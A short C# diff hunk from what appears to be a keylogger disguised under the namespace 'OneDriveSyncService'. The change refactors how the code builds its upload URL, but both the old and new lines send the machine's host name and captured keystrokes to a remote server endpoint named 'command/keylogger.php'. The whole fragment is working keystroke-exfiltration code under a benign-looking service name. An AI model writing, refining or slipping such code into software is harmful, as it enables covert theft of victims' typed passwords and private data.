@@ -242,10 +242,11 @@ namespace OneDriveSyncService
             if (!isStarted) return;
             try
             {
-                string payload = "name=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes();
                 webClient.Headers.Clear();
                 webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                webClient.UploadString(_serverName + "/command/keylogger.php", payload);
+                Uri uri = new Uri(new Uri(_serverName), "command/keylogger.php");
+                string payload = "name=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes();
+                webClient.UploadString(uri, payload);
             }
             catch
             {
